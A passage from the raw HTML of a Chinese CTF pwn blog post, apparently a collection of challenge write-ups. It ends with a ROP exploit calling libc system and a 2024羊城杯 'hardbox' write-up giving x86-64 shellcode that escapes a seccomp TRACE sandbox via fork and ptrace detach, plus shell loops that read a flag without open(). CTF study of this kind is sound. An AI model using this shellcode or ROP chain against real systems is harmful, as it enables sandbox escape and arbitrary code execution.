class="number">0x68</span>)+p64(main_read))</span><br><span class="line">s(p64(bss2+<span class="number">0x50</span>)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x70</span>)+p64(main_read))</span><br><span class="line">s(p64(ret)+p64(bss2)+p64(main_read))</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x78</span>)+p64(main_read))</span><br><span class="line">s(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+p64(bss2)+p64(main_read))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(bss2+<span class="number">0x28</span>)+p64(main_read))</span><br><span class="line">s(p64(<span class="number">0x4011ED</span>)+p64(bss2+<span class="number">0x50</span>)+p64(leave_ret))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2024羊城杯-hardbox"><a href="#2024羊城杯-hardbox" class="headerlink" title="2024羊城杯-hardbox"></a>2024羊城杯-hardbox</h1><p>注意到沙盒并不是return KILL而是return TRACE</p>
<p><strong>内核4.8之前</strong></p>
<p>当追踪器允许系统调用继续执行时，该系统调用不会<strong>重新通过 <code>seccomp</code> 检查</strong>。</p>
<p>即使追踪器修改了系统调用的参数，这些修改后的参数也不会再被 <code>seccomp</code> 验证。</p>
<p>这可能导致安全风险，因为修改后的调用可能违反 <code>seccomp</code> 的规则。</p>
<p><strong>内核4.8的改进</strong></p>
<p>当追踪器允许一个系统调用继续执行时，系统调用会重新经过 <code>seccomp</code> 的检查。</p>
<p>所以只需要通过fork一个进程,trace该进程,并设置追踪seccomp,并在触发seccomp时datach即可绕过seccomp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">NR_fork = <span class="number">57</span></span><br><span class="line">NR_ptrace = <span class="number">101</span></span><br><span class="line">NR_wait = <span class="number">61</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_SETOPTIONS = <span class="number">0x4200</span></span><br><span class="line">PTRACE_O_TRACESECCOMP = <span class="number">0x00000080</span></span><br><span class="line">PTRACE_CONT = <span class="number">7</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line">shellcode = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">main:</span></span><br><span class="line"><span class="string">/*fork()*/</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_fork&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    test rax,rax</span></span><br><span class="line"><span class="string">    jz child_code</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi,<span class="subst">&#123;PTRACE_ATTACH&#125;</span></span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* wait child  */</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_wait&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */</span></span><br><span class="line"><span class="string">    mov r10,<span class="subst">&#123;PTRACE_O_TRACESECCOMP&#125;</span></span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi, 0x4200</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    js error</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* ptrace(PTRACE_CONT, pid, NULL, NULL) */</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;PTRACE_CONT&#125;</span>  /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    js error</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">/* Wait seccomp  */</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_wait&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rsi,rbx</span></span><br><span class="line"><span class="string">    mov rdi,<span class="subst">&#123;PTRACE_DETACH&#125;</span></span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;NR_ptrace&#125;</span></span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>顺便学了个在有shell的情况下不触发open调用拿flag的方法</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> * <span class="comment">#等效ls</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br><span class="line"><span class="comment">#等效cat flag</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r -n1 char; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Character: <span class="variable">$char</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; file.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Line: <span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; file.txt</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>杂题录</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/4584/">https://ixout.github.io/posts/4584/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-12-11</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2024-11-20</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%82%E9%A2%98/">杂题</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/c6d6.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/13785/" title="kernel学习笔记1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/indeximg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kernel学习笔记1</div></div></a></div><div class="next-post pull-right"><a href="/posts/57744/" title="some_rop"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/8373377e69c3499d90.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">some_rop</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">51</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">56</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SCTF2021-Gadget"><span class="toc-number">1.</span> <span class="toc-text">SCTF2021 Gadget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode"><span class="toc-number">2.</span> <span class="toc-text">2021强网杯 shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-printf"><span class="toc-number">3.</span> <span class="toc-text">easy_printf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2020tctf-simple-echoserver"><span class="toc-number">4.</span> <span class="toc-text">2020tctf-simple_echoserver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dev-null"><span class="toc-number">4.1.</span> <span class="toc-text">&#x2F;dev&#x2F;null</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-fmt"><span class="toc-number">5.</span> <span class="toc-text">2023第六届强网拟态-fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#printf%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98"><span class="toc-number">5.1.</span> <span class="toc-text">printf的一个细节问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E-%E6%A0%BC%E5%BC%8F%E5%8C%96%E9%A1%BA%E5%BA%8F"><span class="toc-number">5.1.1.</span> <span class="toc-text">非$格式化顺序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E9%B9%8F%E5%9F%8E%E6%9D%AF-ezthree"><span class="toc-number">6.</span> <span class="toc-text">2022鹏城杯-ezthree</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#socket%E9%80%9A%E4%BF%A1"><span class="toc-number">6.1.</span> <span class="toc-text">socket通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E9%B9%8F%E5%9F%8E%E6%9D%AF-one"><span class="toc-number">7.</span> <span class="toc-text">2022鹏城杯-one</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Plaid2020-sandybox"><span class="toc-number">8.</span> <span class="toc-text">Plaid2020-sandybox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#int3%E7%BB%95%E8%BF%87"><span class="toc-number">8.1.</span> <span class="toc-text">int3绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace"><span class="toc-number">8.2.</span> <span class="toc-text">ptrace</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2022-ezshellcode"><span class="toc-number">9.</span> <span class="toc-text">NCTF2022-ezshellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#volgactf2024-warm-of-pon"><span class="toc-number">10.</span> <span class="toc-text">volgactf2024-warm_of_pon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wm2024-blindness"><span class="toc-number">11.</span> <span class="toc-text">wm2024-blindness</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-overflow"><span class="toc-number">12.</span> <span class="toc-text">ez_overflow</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-hardbox"><span class="toc-number">13.</span> <span class="toc-text">2024羊城杯-hardbox</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>